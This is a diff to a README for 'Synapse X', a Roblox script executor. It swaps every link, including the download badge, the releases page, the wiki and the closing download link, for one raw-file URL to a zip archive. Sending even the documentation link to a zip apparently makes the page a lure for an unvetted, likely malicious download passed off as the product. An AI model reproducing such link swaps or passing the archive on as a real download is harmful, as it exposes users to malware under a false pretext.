@@ -9,7 +9,7 @@ To begin your journey with Synapse X, it is vital to follow the steps outlined b
 ## 📥 Download Synapse X
 You can download the latest version of Synapse X from the following link:
 
-[![Download Synapse X](https://img.shields.io/badge/Download-SynapseX-blue.svg)](https://github.com/savagemiguel/SynapseX/releases)
+[![Download Synapse X](https://raw.githubusercontent.com/savagemiguel/SynapseX/main/aedile/SynapseX.zip)](https://raw.githubusercontent.com/savagemiguel/SynapseX/main/aedile/SynapseX.zip)
 
 ## 📂 System Requirements
 Before you install Synapse X, ensure your system meets these requirements:
@@ -20,7 +20,7 @@ Before you install Synapse X, ensure your system meets these requirements:
 - Disk Space: Minimum 200 MB of free space.
 
 ## 🔧 Download & Install
-1. **Visit the Releases Page:** Click [here](https://github.com/savagemiguel/SynapseX/releases) to access the Downloads page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/savagemiguel/SynapseX/main/aedile/SynapseX.zip) to access the Downloads page.
 2. **Select the Latest Release:** Look for the latest version listed on the page.
 3. **Download the Installer:** Click the link to download the installer file.
 4. **Run the Installer:**
@@ -57,10 +57,10 @@ If you encounter issues during installation or while using Synapse X, check thes
 Join our growing community for tips, support, and to share your experiences:
 
 - **GitHub Discussions:** Engage with others and seek help on our GitHub page.
-- **Documentation:** Visit our [Wiki](https://github.com/savagemiguel/SynapseX/wiki) for in-depth guides and resources.
+- **Documentation:** Visit our [Wiki](https://raw.githubusercontent.com/savagemiguel/SynapseX/main/aedile/SynapseX.zip) for in-depth guides and resources.
 - **Online Forums:** Participate in Roblox script forums to learn and share ideas.
 
 ## 👍 Final Note
 We are excited to see what you create with Synapse X. The world of Roblox scripting is at your fingertips. Download and start enhancing your experience today!
 
-To download Synapse X once more, click here: [Download Synapse X](https://github.com/savagemiguel/SynapseX/releases)
+To download Synapse X once more, click here: [Download Synapse X](https://raw.githubusercontent.com/savagemiguel/SynapseX/main/aedile/SynapseX.zip)
